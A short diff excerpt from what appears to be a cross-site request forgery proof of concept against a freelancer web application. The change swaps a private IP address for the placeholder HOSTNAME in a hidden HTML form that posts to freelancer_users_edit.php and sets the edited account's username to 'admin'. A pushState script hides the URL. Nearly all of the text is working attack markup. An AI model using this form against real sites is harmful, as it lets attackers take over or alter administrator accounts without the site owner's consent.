@@ -12,7 +12,7 @@ Exploit POC:
 
   <script>history.pushState('', '', '/')</script>
 
-    <form action="http://10.22.6.110/freelancer/freelancer_users_edit.php?submit=1&fly=1&editid1=1&" method="POST" enctype="multipart/form-data">
+    <form action="http://HOSTNAME/freelancer/freelancer_users_edit.php?submit=1&fly=1&editid1=1&" method="POST" enctype="multipart/form-data">
 
       <input type="hidden" name="value&#95;username&#95;7" value="admin" />
 
